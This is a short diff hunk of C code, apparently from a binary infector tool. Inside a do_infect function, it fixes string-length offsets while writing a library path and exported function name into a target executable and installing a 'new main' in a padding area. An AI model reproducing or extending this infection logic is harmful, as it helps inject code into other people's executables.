@@ -487,10 +487,10 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	cursor_dst += sizeof(uint64_t);
 	// #4 library path
 	strcpy((char*)cursor_dst, lib_path);
-	cursor_dst += strlen(lib_path);
+	cursor_dst += strlen(lib_path)+1;
 	// #5 function name
 	strcpy((char*)cursor_dst, exported_func);
-	cursor_dst += strlen(exported_func);
+	cursor_dst += strlen(exported_func)+1;
 
 	// put in our new main
 	// which is pad_area.vaddr
